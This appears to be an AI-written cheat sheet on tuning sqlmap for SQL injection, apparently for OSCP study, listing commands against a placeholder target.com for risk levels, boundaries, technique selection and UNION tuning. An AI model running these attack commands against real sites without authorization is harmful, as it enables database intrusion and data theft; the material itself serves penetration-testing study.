# SQLMap Attack Tuning – Quick Runbook

---

## Payload Structure
Each SQLMap payload =  
- **Vector** → SQL logic (e.g. `UNION SELECT`)
- **Boundaries** → prefix/suffix to fit the SQL context

---

## Prefix / Suffix (Rare, Manual Fix)
Use when SQL context breaks default payloads.

```bash
sqlmap -u "http://target.com/?q=test" \
  --prefix="%'))" \
  --suffix="-- -"
````

---

## Level / Risk (Detection Depth)

| Option    | Range | Purpose                   |
| --------- | ----- | ------------------------- |
| `--level` | 1–5   | More boundaries & vectors |
| `--risk`  | 1–3   | More aggressive payloads  |

```bash
sqlmap -u http://target.com/?id=1 --level=5 --risk=3
```

⚠️ Higher = **slower + riskier**

---

## View Payloads (Debug)

```bash
sqlmap -u http://target.com/?id=1 -v 3
```

Shows `[PAYLOAD]` lines.

---

## When to Raise Risk

* Login forms
* OR-based injections required
* Non-SELECT queries

```bash
sqlmap -u http://target.com/login --risk=2
```

---

## Detection Tuning (Responses)

### HTTP Status Code

```bash
sqlmap ... --code=200
```

### Page Title Differences

```bash
sqlmap ... --titles
```

### String Match (TRUE response)

```bash
sqlmap ... --string=success
```

### Text Only (Strip HTML)

```bash
sqlmap ... --text-only
```

---

## Limit Techniques

Skip problematic techniques (e.g. time-based).

| Letter | Technique       |
| ------ | --------------- |
| B      | Boolean-based   |
| E      | Error-based     |
| U      | UNION           |
| T      | Time-based      |
| S      | Stacked queries |

```bash
sqlmap ... --technique=BEU
```

---

## UNION SQLi Tuning

### Known Column Count

```bash
sqlmap ... --union-cols=17
```

### Custom Fill Value

```bash
sqlmap ... --union-char='a'
```

### Required FROM Clause (Oracle, etc.)

```bash
sqlmap ... --union-from=users
```

---

## Payload Volume Reference

| Settings                       | Payloads |
| ------------------------------ | -------- |
| Default (`--level=1 --risk=1`) | ~72      |
| Max (`--level=5 --risk=3`)     | ~7,865   |

---


If you want, I can compress this into a **1-screen OSCP cheatsheet** or add **real-world examples (login bypass, Oracle, MSSQL)**.
```
